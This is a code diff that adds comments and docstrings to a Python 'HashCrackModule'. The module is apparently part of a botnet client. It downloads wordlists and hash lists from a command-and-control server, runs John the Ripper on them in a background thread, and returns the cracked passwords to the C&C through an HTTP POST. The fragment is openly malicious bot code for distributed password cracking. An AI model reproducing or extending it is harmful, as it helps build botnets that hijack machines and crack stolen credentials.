@@ -13,6 +13,15 @@ from httplib import HTTPConnection
 import urllib
 
 class HashCrackModule(FeatureModule):    
+    """ The HashCrackModule class which is able to execute brute force
+        hash cracking attacks.
+        
+        
+        Attributes:
+            __john: The reference of JTR subprocess.
+            DATA_PATH: data path for input files.
+    """
+    
     __john = None    
     
     DATA_PATH = "data"        
@@ -22,20 +31,23 @@ class HashCrackModule(FeatureModule):
         super(HashCrackModule, self).__init__("HashCrackModule")
     
     def start(self, *args):
-        """ Creates a subprocess of john and invokes it
+        """ Creates a subprocess of jtr and invokes it
             with the given arguments."""
                 
         #args[0] = ['md5', 'wlist.txt', 'hashes.txt']
+        #download wordlist and hashes
         self.downloadList(args[0][1])
         self.downloadList(args[0][2])
         
+        #prepare command line arguments
         args[0][0] = "--format=" + args[0][0]
         args[0][1] = "--wordlist=" + os.getcwd() + "/" + self.DATA_PATH + "/" + args[0][1]
         args[0][2] = os.getcwd() + "/" + self.DATA_PATH + "/" + args[0][2] 
-        #print args[0]
+        
         cline = [BotConfig.JOHN_PATH]
         cline = cline + args[0]
         
+        #start the subprocess in a separate thread.
         t = Thread(target=self.__run, args=[cline])
         t.start()
     
@@ -57,6 +69,9 @@ class HashCrackModule(FeatureModule):
         self.__john.kill()
         
     def downloadList(self, fileName):
+        """ Downloads given file from the C&C
+        """
+        
         conn = HTTPConnection(BotConfig.SERVER_IP, BotConfig.SERVER_PORT)
         conn.request("GET", "/" + self.DATA_PATH + "/" + fileName)             
         response = conn.getresponse()
@@ -70,6 +85,9 @@ class HashCrackModule(FeatureModule):
         conn.close()
         
     def getResults(self):      
+        """ Returns the cracking results to the C&C 
+            via a HTTP POST request.
+        """
         
         with open(BotConfig.JOHN_POT_PATH) as f:
             result = f.read()
